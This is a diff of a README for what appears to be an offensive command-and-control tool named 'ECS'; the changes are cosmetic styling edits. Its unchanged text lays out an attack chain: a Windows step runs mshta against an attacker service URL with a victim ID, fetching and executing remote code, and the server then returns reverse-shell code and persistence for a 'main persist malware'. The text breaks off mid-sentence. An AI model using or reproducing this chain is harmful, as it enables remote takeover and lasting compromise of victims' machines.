@@ -1,12 +1,12 @@
 # ECS
 ![](./ECC.png)
 
-## <span style="color:blue"> step1:  </span>
+## <code style="color : red">step1: </code>
 
  <span style="color:blue"> victim exec the malware or rce on victim : </span>
 #### <span style="color:blue"> For windows:  </span>
-```powershell 
-mshta https://< ecs service url >?uid=< victim uid >&s=1< step number in this >
+```powershell  
+mshta https://< ecs service url >?uid=< victim uid >&s=1< step number in this > 
 ``` 
 ## <span style="color:blue"> step 2 </span>
 <span style="color:blue"> server response to victim the reversshell code and persistant acts and make main persist malware
